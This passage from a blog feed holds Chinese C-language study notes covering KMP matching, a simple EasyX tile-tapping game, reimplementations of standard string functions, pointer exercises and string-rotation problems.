if(S[i] == P[j+1])             j ++;        if(j == n)             printf(&quot;%d\n&quot;, i-n+1);    &#125;</code></pre><p>双指针: i扫描主串，j扫描模式串。<br>初始化，i&#x3D;1，j&#x3D;0.<br>每轮for，i向右走一步。</p><ol><li>若s[i]!&#x3D;p[j+1],让j回跳到能匹配的位置，如果找不到能匹配的位置，j回跳到0.</li><li>若s[i]&#x3D;&#x3D;p[j+1],让j向右走一步。</li><li>若匹配成功，输出匹配位置。</li><li>时间复杂度同样是O(n)</li></ol><p><img src="https://s2.loli.net/2023/04/09/Lfxs64gRqjUoJdX.png" alt="image.png"></p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><pre><code class="C++">#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstdio&gt;using namespace std;const int N = 100;int m, n;char S[N], P[N];int ne[N];int main()&#123;    cin &gt;&gt; S+1 &gt;&gt; P+1;    m = strlen(S+1), n = strlen(P+1);    // 计算next函数    puts(S);    puts(P);     //printf(&quot;%d %d&quot;,m ,n);    ne[1] = 0;    for(int i = 2, j = 0; i &lt;= n; i ++)&#123;        while(j &amp;&amp; P[i] != P[j+1]) j = ne[j];        if(P[i] == P[j+1]) j ++;         ne[i] = j;    &#125;    // KMP匹配    for(int i = 1, j = 0; i &lt;= m; i ++)&#123;        while(j &amp;&amp; S[i] != P[j+1]) j = ne[j];        if(S[i] == P[j+1]) j ++;        if(j == n) printf(&quot;%d\n&quot;, i-n+1);    &#125;    for(int i = 1; i &lt;= n; i ++)        printf(&quot;%d &quot;, ne[i]);    return 0;&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>别踩白块儿</title>
      <link href="/2023/04/05/%E5%88%AB%E8%B8%A9%E7%99%BD%E5%9D%97%E5%84%BF/"/>
      <url>/2023/04/05/%E5%88%AB%E8%B8%A9%E7%99%BD%E5%9D%97%E5%84%BF/</url>
      
        <content type="html"><![CDATA[<h1 id="鼠标判断不正常-待填的坑"><a href="#鼠标判断不正常-待填的坑" class="headerlink" title="鼠标判断不正常(待填的坑)"></a>鼠标判断不正常(待填的坑)</h1><pre><code class="CPP">#define _CRT_SECURE_NO_WARNINGS#include&lt;stdio.h&gt;#include&lt;easyx.h&gt;  //图形库，绘制图形，输出文字#include&lt;stdlib.h&gt;#include&lt;time.h&gt;/** 别踩白块：c+easyx**/#define INTERVAL 100 //标题高度#define GRID_W 100 //块的宽度#define GRID_H 150 //块的高度//定义数组，存储黑块int flags[4] = &#123; 0 &#125;;//统计成功点了多少个黑块int gCount = 0;void init()&#123;    //设置随机数种子    srand((unsigned int)time(NULL));    //随机生成黑块    for (int i = 0; i &lt; 4; i++)    &#123;        flags[i] = rand() % 4;//0,1,2,3    &#125;&#125;void draw()&#123;    const char* title = &quot;别踩白块儿&quot;;    setlinestyle(PS_SOLID, 2);    //线条的颜色，默认是白色    setlinecolor(BLACK);    for (int i = 0; i &lt; 5; i++)    &#123;        //画横线        line(0, i * 150 + INTERVAL, 400, i * 150 + INTERVAL);        //画竖线        line(100 * i, INTERVAL, i * 100, 700);    &#125;    //设置文字颜色,样式    settextcolor(BLACK);    settextstyle(38, 0, &quot;Arial&quot;);    //输出标题(居中)    int spaceW = (getwidth() - textwidth(title)) / 2;    int spaceH = (INTERVAL - textheight(title)) / 2;    outtextxy(spaceW, spaceH, title);    //绘制黑块    setfillcolor(BLACK);    for (int i = 0; i &lt; 4; i++)    &#123;        //求出黑块的左上角坐标;        int x = flags[i] * GRID_W;        int y = i * GRID_H + INTERVAL;        if (i == 3)        &#123;            setfillcolor(RGB(156, 156, 156));        &#125;        //绘制一个矩形        fillrectangle(x, y, x + GRID_W, y + GRID_H);    &#125;    //输出分数    settextstyle(26, 0, &quot;微软雅黑&quot;);    char score[30] = &#123; 0 &#125;;    sprintf_s(score,&quot;Score:%d&quot;, gCount);    outtextxy(20, 40, score);&#125;//处理鼠标点击bool mousePressMsg(ExMessage* msg)&#123;    //获取下标为2的黑块的坐标    int x = flags[2]*GRID_W;    int y = 2 * GRID_H + INTERVAL;        //判断是不是点击的下标为2的黑块    if (msg-&gt;x &gt; x &amp;&amp; x &lt; x + GRID_W  &amp;&amp; msg-&gt;y &gt; y &amp;&amp; msg-&gt;y &lt; y + GRID_H)    &#123;        //黑块从上往下移动        for (int i = 3; i &gt; 0; i--)        &#123;            flags[i] = flags[i - 1];        &#125;        flags[0] = rand() % 4;//随机生成        gCount++;        printf(&quot;你点击了正确的黑块\n&quot;);        &#125;    else    &#123;    //printf(&quot;%s&quot;, __FUNCTION__); /* 输出是什么函数 */        return false;    &#125;    return true;    &#125;//void gameOverHit(int w, int h)&#123;    setlinecolor(GREEN);    setfillcolor(RGB(93, 107, 153));    //画一个矩形    int spaceH = (getwidth() - w) / 2;    int spaceV = (getwidth() - h) / 2;    fillrectangle(spaceH, spaceV, spaceH + w, spaceV + h);    int mid_w = (spaceH + w) / 2;    int mid_h = (2*spaceV+h) / 2;    outtextxy(mid_w, mid_h, &quot;lyx is sb&quot;);&#125;int main()&#123;    //1.黑窗口，来个图形窗口    initgraph(400, 700, EX_SHOWCONSOLE);    //设置背景颜色    setbkcolor(WHITE);    cleardevice();    setbkmode(TRANSPARENT);    init();        draw();    //游戏主循环    bool isDone = false;    while (!isDone)    &#123;        //消息(鼠标)处理        ExMessage msg = &#123; 0 &#125;;        if (peekmessage(&amp;msg))        &#123;            //按ESC退出游戏            switch (msg.message)            &#123;            case WM_KEYDOWN:                if (msg.vkcode == VK_ESCAPE)                &#123;                    printf(&quot;quit\n&quot;);                    isDone = true;                &#125;                break;            case WM_LBUTTONDOWN:                if (!mousePressMsg(&amp;msg))                &#123;                    isDone = true;                &#125;;            default:                break;            &#125;        &#125;        //绘制        BeginBatchDraw();//清除缓存        cleardevice();//清屏        draw();        EndBatchDraw();    &#125;    gameOverHit(200,150);    /*    //设置线条的样式    setlinestyle(PS_SOLID, 3);    //设置线条yanse    setlinecolor(RED);    //绘制线条    line(0, 0, 640, 480);        //设置填充颜色    setfillcolor(GREEN);    //绘制矩形    rectangle(50, 50, 50 + 250, 50 + 50);    fillrectangle(50, 160, 50 + 250, 60 + 50);    */    getchar();    return 0;&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>字符串函数模拟实现</title>
      <link href="/2023/04/02/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0/"/>
      <url>/2023/04/02/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="size-t-strlen-const-char-str-求字符串长度"><a href="#size-t-strlen-const-char-str-求字符串长度" class="headerlink" title="size_t strlen(const char* str)求字符串长度"></a>size_t strlen(const char* str)求字符串长度</h1><pre><code class="C">#include &lt;stdio.h&gt;#include &lt;assert.h&gt;//1.计数器版本int my_strlen(const char* str)&#123;    int count = 0;    assert(str != NULL);    while (*str != &#39;\0&#39;) &#123;        count++;        str++;    &#125;    return count;&#125;int main()&#123;    char arr[] = &quot;abc&quot;;    int len = my_strlen(arr);    printf(&quot;%d&quot;, len);    return 0;&#125;</code></pre><ol><li>字符串已经以’\0’作为结束标志，strlen函数返回的是在字符串中’\0’前面出现的字符个数（不包含’\0’）。–{‘a’,’b’}不可以</li><li>参数指向的字符串必须要以’\0’结束</li><li>函数的返回值是size_t，是无符号的</li></ol><h1 id="char-strcpy-char-destination-const-char-source-拷贝字符串"><a href="#char-strcpy-char-destination-const-char-source-拷贝字符串" class="headerlink" title="char* strcpy(char* destination, const char* source)拷贝字符串"></a>char* strcpy(char* destination, const char* source)拷贝字符串</h1><pre><code class="C">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;assert.h&gt;//str1 -- destination//str2 -- sourcechar* my_strcpy(char* str1,const char* str2)&#123;    int i = 0;    while (*str2 != &#39;\0&#39;) &#123;        *(str1 + i) = *str2;        str2++;        i++;    &#125;    *(str1 + i) = &#39;\0&#39;;    return str1;&#125;int main()&#123;    char arr[20] = &#123; 0 &#125;;    char* p = &quot;hello&quot;;    my_strcpy(arr, p);    puts(arr);    return 0;&#125;</code></pre><ol><li>源字符串必须要以’\0’结束</li><li>会将源字符串中的’\0’拷贝到目标空间</li><li>目标空间必须足够大，以确保能存放源字符串</li><li>目标空间必须可变（不可以是char* str &#x3D; “#####”）</li></ol><h1 id="char-strcat-char-destination-const-char-source-字符串追加"><a href="#char-strcat-char-destination-const-char-source-字符串追加" class="headerlink" title="char* strcat(char* destination, const char* source)字符串追加"></a>char* strcat(char* destination, const char* source)字符串追加</h1><pre><code class="C">#define _CRT_SECURE_NO_WARNINGS 1#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;assert.h&gt;void* my_strcat(char* dest, const char* src)&#123;    assert(dest &amp;&amp; src);    //1.找目标字符串中得\0    while (*dest) &#123;        dest++;    &#125;    //2.追加源字符串，连\0一起    while (*dest++ = *src++) &#123;        ;    &#125;&#125;int main()&#123;    char arr[20] = &quot;hello &quot;;//world!    char arr2[] = &quot;world!&quot;;//传数组名也可以    //strcat(arr, arr2);    my_strcat(arr,&quot;world!&quot;);//字符串追加（连接）    puts(arr);    return 0;&#125;/* 如果需要返回类型为char*char* my_strcat(char* dest, const char* src)&#123;    char* ret = dest;    assert(dest &amp;&amp; src);    //1.找目标字符串中得\0    while (*dest) &#123;        dest++;    &#125;    //2.追加源字符串，连\0一起    while (*dest++ = *src++) &#123;        ;    &#125;    return ret;&#125;*/</code></pre><ol><li>源字符串必须以’\0’结束</li><li>目标空间必须足够大。</li><li>目标空间必须可以修改</li><li>但不能自己给自己追加</li></ol><h1 id="int-strcmp-const-char-str1-const-char-str2"><a href="#int-strcmp-const-char-str1-const-char-str2" class="headerlink" title="int strcmp(const char* str1, const char* str2)"></a>int strcmp(const char* str1, const char* str2)</h1><pre><code class="C">#define _CRT_SECURE_NO_WARNINGS 1#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;assert.h&gt;int my_strcmp(const char* str1, const char* str2)&#123;    assert(str1);    assert(str2);    while (*str1 == *str2)    &#123;        if (*str1 == &#39;\0&#39; || *str2 == &#39;\0&#39;)         &#123;            break;        &#125;        str1++;        str2++;    &#125;    return  *str1 - *str2;&#125;int main()&#123;    char* p = &quot;obcb&quot;;    char* q = &quot;obca&quot;;    int ret = my_strcmp(p, q);    printf(&quot;%d&quot;, ret);    return 0;&#125;</code></pre><ol><li>第一个字符串大于第二个字符串，则返回大于0得数字</li><li>等于，则返回0</li><li>小于，则返回小于0的数字</li></ol><p><em>strcpy strcat strcmp 长度不受限制的字符串函数</em></p><p><em>strncpy strncay strncmp 长度受限制的字符串，可以控制参与变化的字符串中的字符个数</em></p><h1 id="char-strstr-char-str1-const-char-str2"><a href="#char-strstr-char-str1-const-char-str2" class="headerlink" title="char * strstr (       char * str1, const char * str2 );"></a>char * strstr (       char * str1, const char * str2 );</h1><pre><code class="C">#define _CRT_SECURE_NO_WARNINGS 1#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;assert.h&gt;char* my_strstr(const char* str1, const char* str2)&#123;    assert(str1 &amp;&amp; str2);    const char* s1 = NULL;    const char* s2 = NULL;    const char* cp = str1;    if (*str2 == &#39;\0&#39;)    &#123;        return (char*)str1;    &#125;    while (*cp)    &#123;        s1 = cp;        s2 = str2;        while (*s1 &amp;&amp; *s2 &amp;&amp; (*s1 == *s2))        &#123;            s1++;            s2++;        &#125;        if (*s2 == &#39;\0&#39;)        &#123;            return (char*)cp;        &#125;        cp++;    &#125;    return NULL;&#125;int main()&#123;    char arr1[] = &quot;abcdefabcdef&quot;;    char arr2[] = &quot;bcd&quot;;    //在arr1中查找arr2    char* ret = my_strstr(arr1, arr2);    if (ret == NULL)    &#123;        printf(&quot;没找到\n&quot;);    &#125;    else    &#123;        printf(&quot;找到了:%s\n&quot;, ret);    &#125;    return 0;&#125;</code></pre><h1 id="char-strtok-char-str-const-char-delimiters-字符串切割函数"><a href="#char-strtok-char-str-const-char-delimiters-字符串切割函数" class="headerlink" title="char * strtok ( char * str, const char * delimiters );字符串切割函数"></a>char * strtok ( char * str, const char * delimiters );字符串切割函数</h1><pre><code class="C">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;assert.h&gt;//用法int main()&#123;    char arr1[] = &quot;123@bcda.com&quot;;    char* p = &quot;@.&quot;;    char tmp[20] = &#123; 0 &#125;;    char* ret = NULL;    for (ret = strtok(arr1, p); ret != NULL;ret=strtok(NULL,p))    &#123;        puts(ret);    &#125;    return 0;&#125;</code></pre><pre><code class="C"></code></pre><ol><li>sep参数是个字符串，定义了用作分隔符的字符集合</li><li>第一个参数指定一个字符串，它包含了0个或者多个又sep字符串中一个或者多个分隔符分割的标记。</li><li>strtok函数找到str中的下一个标记，并将其用\0结尾，返回一个指向这个标记的指针。（注：strtok函数会改变被操作的字符串，所以在使用strtok函数切分的字符串一般都是用临时拷贝的内容并且可修改。）</li><li>strtok函数的第一个参数不为NULL，函数将找到str中第一个标记，strtok函数将保存它在字符串中的位置。</li><li>strtok函数的第一个参数为NULL，函数将在同一个字符串中被保存的位置开始，朝朝下一个标记。</li><li>如果字符串中不存在更多的标记，则返回NULL指针</li></ol><h1 id="char-strerror-int-errnum-返回错误码，所对应的错误信息"><a href="#char-strerror-int-errnum-返回错误码，所对应的错误信息" class="headerlink" title="char* strerror(int errnum)返回错误码，所对应的错误信息"></a>char* strerror(int errnum)返回错误码，所对应的错误信息</h1><pre><code class="C">#define _CRT_SECURE_NO_WARNINGS 1#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;errno.h&gt;//使用库函数的时候可能失败//会设置错误代码//int errno;//5//C语言已经设置好了int main()&#123;    printf(&quot;%s\n&quot;, strerror(0));    printf(&quot;%s\n&quot;, strerror(1));    printf(&quot;%s\n&quot;, strerror(2));    printf(&quot;%s\n&quot;, strerror(3));    printf(&quot;%s\n&quot;, strerror(4));    return 0;&#125;</code></pre><p><img src="https://s2.loli.net/2023/04/06/ZPfVjiLTNgBovMH.png" alt="image.png"></p><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>比如在打开不存在的文件时，会报错，错误码会记录信息，可以通过这个函数打印出信息，errno是c语言定义好的全局变量，用的时候要包含头文件errno.h</p><pre><code class="C">#define _CRT_SECURE_NO_WARNINGS 1#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;errno.h&gt;//使用库函数的时候可能失败//会设置错误代码//int errno;//5//int main()&#123;    FILE* pf = fopen(&quot;aszxc.txt&quot;, &quot;r&quot;);    if (pf == NULL)    &#123;        printf(&quot;%s\n&quot;, strerror(errno));        return 1;    &#125;    fclose(pf);    pf = NULL;    return 0;&#125;</code></pre><p><img src="https://s2.loli.net/2023/04/06/pEcQfHUOTn9LNkt.png" alt="image.png"></p><h1 id="perror-char-str-直接打印错误信息"><a href="#perror-char-str-直接打印错误信息" class="headerlink" title="perror(char* str)直接打印错误信息"></a>perror(char* str)直接打印错误信息</h1><ol><li>首先把错误码转化为错误信息</li><li>打印错误信息（包含了自定义的信息）</li></ol><h2 id="str自定义信息"><a href="#str自定义信息" class="headerlink" title="str自定义信息"></a>str自定义信息</h2>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>指针练习</title>
      <link href="/2023/03/25/%E6%8C%87%E9%92%88%E7%BB%83%E4%B9%A01/"/>
      <url>/2023/03/25/%E6%8C%87%E9%92%88%E7%BB%83%E4%B9%A01/</url>
      
        <content type="html"><![CDATA[<h1 id="指针练习（一）"><a href="#指针练习（一）" class="headerlink" title="指针练习（一）"></a>指针练习（一）</h1><ol><li>下列程序的结果</li></ol><pre><code class="C">#define _CRT_SECURE_NO_WARNINGS_#include &lt;stdio.h&gt;int main()&#123;    int a[5] = &#123; 1,2,3,4,5 &#125;;    int* ptr = (int*)(&amp;a + 1);    printf(&quot;%d,%d&quot;, *(a + 1), *(ptr - 1));    return 0;&#125;</code></pre><p>结果是 2，5</p><p>首元素地址+1指第二个元素的地址，即2。&amp;a + 1 指向的是5后面一个的地址，-1又回去了</p><p>2. </p><pre><code class="C">#define _CRT_SECURE_NO_WARNINGS_#include &lt;stdio.h&gt;struct Test&#123;    int Num;    char* pcName;    short sDate;    char cha[2];    short sBa[4];&#125;;//假设p的值为0x100000，如下表达式的值分别为多少//Test的大小是20字节int main()&#123;    printf(&quot;%p\n&quot;, p + 0x1);//0x100014    printf(&quot;%p\n&quot;, (unsigned long)p + 0x1);//0x100001 p被强制转换成整型了    printf(&quot;%p\n&quot;, (unsigned int*)p + 0x1);//0x100001无符号整型指针+1跳过一个无符号整型即+4    return 0;&#125;</code></pre><p><em>前提是32位编译</em><br><img src="https://s2.loli.net/2023/03/25/Byzj3GQ1f4uEOP2.png" alt="image.png"><br> 答：p+0x1指针+1就是指跳过一个Test结构体所以+20</p><p>0x100001 p被强制转换成整型了</p><p>0x100004无符号整型指针+1跳过一个无符号整型即+4<br> <img src="https://s2.loli.net/2023/03/25/T5HVgdj8Y4IfZbC.png" alt="image.png"></p><p> 64位的时候一个指针是8byte你结构体就是32字节了所以+1就是0x20</p><ol start="3"><li></li></ol><pre><code class="C">#define _CRT_SECURE_NO_WARNINGS_#include &lt;stdio.h&gt;int main()&#123;    int a[4] = &#123; 1,2,3,4 &#125;;    int* ptr1 = (int*)(&amp;a + 1);    int* ptr2 = (int*)((int)a + 1);    printf(&quot;%x,%x&quot;, ptr1[-1], *ptr2);    return 0;&#125;</code></pre><p><img src="https://s2.loli.net/2023/03/25/RHBqZiWdEYsOrPN.png" alt="image.png"></p><p>4,20000</p><p>4：&amp;a + 1刚好在4后面一个，-1又回到4</p><p>而对于ptr2，小端存储</p><p>01 00 00 00 | 02 00 00 00 | 03 00 00 00 | 04 00 00 00 |</p><p>ptr2指向的地址被转换成int后+1 相当于从-&gt;01变为01-&gt;00然后再输出向后数4个byte，即使0x 02 00 00 00</p><ol start="4"><li></li></ol><pre><code class="C">#define _CRT_SECURE_NO_WARNINGS_#include &lt;stdio.h&gt;int main()&#123;    int a[3][2] = &#123; (0,1),(2,3),(4,5) &#125;;// --&gt;&#123;1,3,5&#125;    int* p;    p = a[0];//p -&gt; *(p + 0)    printf(&quot;%d&quot;, p[0]);    return 0;&#125;</code></pre><p>结果 1</p><p>1 | 3<br>5 | 0<br>0 | 0</p><p>括号表达式，算最后一个逗号右边的结果,所以p-&gt;1</p><ol start="5"><li></li></ol><pre><code class="C">#define _CRT_SECURE_NO_WARNINGS_#include &lt;stdio.h&gt;int main()&#123;    int a[5][5];    int(*p)[4];    p = a;    printf(&quot;%p,%d\n&quot;, &amp;p[4][2] - &amp;a[4][2], &amp;p[4][2] - &amp;a[4][2]);    return 0;&#125;</code></pre><p><img src="https://s2.loli.net/2023/03/26/DCvZij19lVN2ALW.png" alt="image.png"></p><p>地址无正负之分，补码的-4是FFFFFFFC,-4</p><p>6. </p><pre><code class="C">#define _CRT_SECURE_NO_WARNINGS_#include &lt;stdio.h&gt;int main()&#123;    int aa[2][5] = &#123; 1,2,3,4,5,6,7,8,9,10 &#125;;    int* ptr1 = (int*)(&amp;aa + 1);    int* ptr2 = (int*)(*(aa + 1));    printf(&quot;%d,%d&quot;, *(ptr1 - 1), *(ptr2 - 1));    return 0;&#125;</code></pre><p>结果是10，5.10是因为&amp;aa+1指的是跳过整个二维数组，再-1回到最后一个元素。<br>5是因为*（aa + 1）指的是跳过一行，再-1回到第一行最后一个元素5</p><ol start="7"><li></li></ol><pre><code class="C">#define _CRT_SECURE_NO_WARNINGS_#include &lt;stdio.h&gt;int main()&#123;    char* a[] = &#123; &quot;work&quot;, &quot;at&quot;, &quot;alibaba&quot; &#125;;    char** pa = a;    pa++;    printf(&quot;%s\n&quot;, *pa);    return 0;&#125;</code></pre><p>结果at,char* p &#x3D; “abc”,所以char* a[],里面又三个char*,pa++就是指向at</p><ol start="8"><li></li></ol><pre><code class="C">#define _CRT_SECURE_NO_WARNINGS_#include &lt;stdio.h&gt;int main()&#123;    char* c[] = &#123; &quot;ENTER&quot;, &quot;NEW&quot;, &quot;POINT&quot;, &quot;FIRST&quot; &#125;;    char** cp[] = &#123;c + 3, c + 2, c + 1, c&#125;;    char*** cpp = cp;    printf(&quot;%s\n&quot;, **++cpp);    printf(&quot;%s\n&quot;, *-- * ++cpp + 3);    printf(&quot;%s\n&quot;, *cpp[-2] + 3);    printf(&quot;%s\n&quot;, cpp[-1][-1] + 1);    return 0;&#125;</code></pre><p><img src="https://s2.loli.net/2023/03/26/OgFkEjHZeVU9q3A.png" alt="image.png"></p><p>注意++cpp，做完运算在第二个表达式中结果保留</p><p>第一个cpp先++指的是c+2，再解引用两次刚好到”POINT”<br>第二个cpp先++指的是c+1,解引用完再–变成c,再解引用指的是”ENTER”,+3刚好从E开始输出ER。<br>第三个cpp[]-&gt;* cpp,然后再解引用即** （cpp-2）+3，cpp-2回到开始的位置，即c+3，解2次引用就是FIRST，+3就是从S开始输出ST<br>第四个是指* (* (cpp - 1) - 1)+1,即先* (cpp - 1) 得到c + 2，再 - 1 得到c + 1,接引用完是”NEW”,再+1指的是从E开始输出EW</p><p><img src="https://s2.loli.net/2023/03/26/sIXVecfFPxo5qBT.png" alt="image.png"></p><ol start="9"><li>杨氏矩阵<br>有一个数字矩阵，矩阵的每行从左到右递增，矩阵从上到下是递增的<br>请编写程序在这样的矩阵中查找某个数字是否存在<br>要求时间复杂度小于O（N）</li></ol><p>思路：因为每一行右边最大，所以比较最右边，小了就去掉这一行，直接看下一行，每一列的最下面都是最大的，比较后，小了就去掉这一列，这样就能保住时间复杂度了.</p><pre><code class="C">#define _CRT_SECURE_NO_WARNINGS_#include &lt;stdio.h&gt;int find_num(int arr[3][3], int r, int c, int k)&#123;    int x = 0;    int y = c - 1;    while (x &lt; c &amp;&amp; y &gt;= 0) &#123;        if (arr[x][y] &lt; k)            x++;//加一行        else if (arr[x][y] &gt; k)            y--;//去一列        else            return 1;    &#125;    return 0;&#125;int main()&#123;    int a[3][3] = &#123; 1,2,3,                    4,5,6,                    7,8,9 &#125;;    //查找一个数字，比如7    //可以遍历但时间复杂度就变为O（N^2）    //O(1):不管几个元素都是遍历常数次    int k = 7;    //如果找到返回1，否则返回0    int ret = find_num(a, 3, 3, k);    if (ret == 1)        printf(&quot;找到了\n&quot;);    else        printf(&quot;找不到\n&quot;);    return 0;&#125;</code></pre><p>如果要返回坐标怎么办（return只能返回一个值）怎么改</p><pre><code class="C">#define _CRT_SECURE_NO_WARNINGS_#include &lt;stdio.h&gt;int find_num(int arr[3][3], int *px, int *py, int k)&#123;    int x = 0;    int y = *py - 1;    while (x &lt; *px &amp;&amp; y &gt;= 0) &#123;        if (arr[x][y] &lt; k)            x++;//加一行        else if (arr[x][y] &gt; k)            y--;//去一列        else &#123;            *px = x;            *py = y;            return 1;        &#125;                &#125;    return 0;&#125;int main()&#123;    int a[3][3] = &#123; 1,2,3,                    4,5,6,                    7,8,9 &#125;;    int k = 7;    int x = 3;//行    int y = 3;//列    /*    &amp;x，&amp;y    1.传入参数    2.带回值    */    int ret = find_num(a, &amp;x, &amp;y, k);    if (ret == 1) &#123;        printf(&quot;找到了\n&quot;);        printf(&quot;下标是:%d %d&quot;, x, y);    &#125;            else        printf(&quot;找不到\n&quot;);    return 0;&#125;</code></pre><p><img src="https://s2.loli.net/2023/03/26/pcAUBO8CReSuVKE.png" alt="image.png"></p><h1 id="字符串左旋"><a href="#字符串左旋" class="headerlink" title="字符串左旋"></a>字符串左旋</h1><h2 id="题目内容："><a href="#题目内容：" class="headerlink" title="题目内容："></a>题目内容：</h2><p>实现一个函数，可以左旋字符串中的k个字符</p><h2 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h2><p>ABCD左旋第一个字符得到BCDA</p><p>ABCD左旋两个字符得到CDAB</p><pre><code class="C">#include &lt;stdio.h&gt;#include &lt;string.h&gt;void string_rotate(char* str, int k)&#123;    int i = 0;    int len = strlen(str);    for (i = 0; i &lt; k; i++) &#123;        //每次左旋一个字符        char tmp = *str;//首地址         // 把后面的n-1个字符往前挪         int j = 0;        for (j = 0; j &lt; len - 1; j++) &#123;            *(str + j) = *(str + j + 1);        &#125;        //tmp再放到最后        *(str + len - 1) = tmp;    &#125;    &#125;int main()&#123;    char arr[10] = &quot;ABCDEF&quot;;     int k;    scanf(&quot;%d&quot;, &amp;k);    string_rotate(arr, k);    puts(arr);    return 0; &#125; </code></pre><h3 id="神奇的方法"><a href="#神奇的方法" class="headerlink" title="神奇的方法"></a>神奇的方法</h3><p>比如A B C D E F  k &#x3D; 2<br>先逆序 A B  再逆序D E F<br>得到 B A F E D<br>再整体逆序得到<br>D E F A B<br>神奇<br>代码实现加个之前写过的逆序即可</p><pre><code class="C">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;assert.h&gt;void reverse(char* left, char* right)&#123;     assert(left);    assert(right);     while (left &lt; right) &#123;        char tmp = *left;        *left = *right;        *right = tmp;        left++;        right--;    &#125;&#125;void string_rotate(char* str, int k)&#123;    assert(str);    int n = strlen(str);    reverse(str, str + k - 1);//左     reverse(str + k, str + n - 1);//右     reverse(str, str + n - 1);//整体     &#125;int main()&#123;    char arr[10] = &quot;ABCDEF&quot;;     int k;    scanf(&quot;%d&quot;, &amp;k);    string_rotate(arr, k);    puts(arr);    return 0; &#125; </code></pre><h2 id="进一步深入"><a href="#进一步深入" class="headerlink" title="进一步深入"></a>进一步深入</h2><p>写一个函数，判断一个字符串是否是另外一个字符串旋转之后的字符串。</p><h2 id="例：-1"><a href="#例：-1" class="headerlink" title="例："></a>例：</h2><p>给定s1&#x3D;AABCD和s2&#x3D;BCDAA,返回1<br>给定s1&#x3D;abcd和s2&#x3D;ACBD,返回0</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>每转一次都比较以下</p><pre><code class="C">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;assert.h&gt;int is_string_rotate(char* str1, char* str2)&#123;    int i = 0;    int n = strlen(str1);//5    for (i = 0; i &lt; n; i++) &#123;        //每次左旋一个字符        char tmp = *str1;        // 把后面的n-1个字符往前挪         int j = 0;        for (j = 0; j &lt; n - 1; j++) &#123;            *(str1 + j) = *(str1 + j + 1);        &#125;        //tmp再放到最后        *(str1 + n - 1) = tmp;        if (strcmp(str1, str2) == 0) &#123;            return 1;        &#125;    &#125;    return 0;&#125;int main()&#123;    char arr1[] = &quot;AABCD&quot;;     char arr2[] = &quot;BCDAA&quot;;      int ret = is_string_rotate(arr1, arr2);    if (ret == 1)&#123;        printf(&quot;Yes&quot;);    &#125;    else &#123;        printf(&quot;No&quot;);    &#125;    return 0; &#125; </code></pre><h3 id="神奇的方法-1"><a href="#神奇的方法-1" class="headerlink" title="神奇的方法"></a>神奇的方法</h3><p>将AABCD重复俩遍可以得到所有的反转<br>AABCDAABCD<br>A ABCDA ABCD<br>AA BCDAA BCD<br>………</p><p>改版后的代码</p><pre><code class="C">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;assert.h&gt;int is_string_rotate(char* str1, char* str2)&#123;    assert(str1);    assert(str2);    //长度不相等，肯定不是     if (strlen(str1) != strlen(str2))&#123;        return 0;    &#125;    //1.str1字符串的后边追加一个str1    //AABCDAABCD    int n = strlen(str1);     strncat(str1, str1, n);//追加后面的字符串前n个在前面的字符串     //2.判断str2是否为str1的子串     strstr(str1, str2);//判断一个字符串是否是另一个字符串的子串     //返回找到的str2在str1第一次匹配的地址     char* ret = strstr(str1, str2);    return ret != NULL;&#125;int main()&#123;    char arr1[20] = &quot;AABCD&quot;;     char arr2[] = &quot;BCDAA&quot;;      int ret = is_string_rotate(arr1, arr2);    if (ret == 1)&#123;        printf(&quot;Yes&quot;);    &#125;    else &#123;        printf(&quot;No&quot;);    &#125;    return 0; &#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数学建模中的问题C解决</title>
      <link href="/2023/03/23/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E4%B8%AD%E7%9A%84%E9%97%AE%E9%A2%98C%E8%A7%A3%E5%86%B3/"/>
      <url>/2023/03/23/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E4%B8%AD%E7%9A%84%E9%97%AE%E9%A2%98C%E8%A7%A3%E5%86%B3/</url>
      
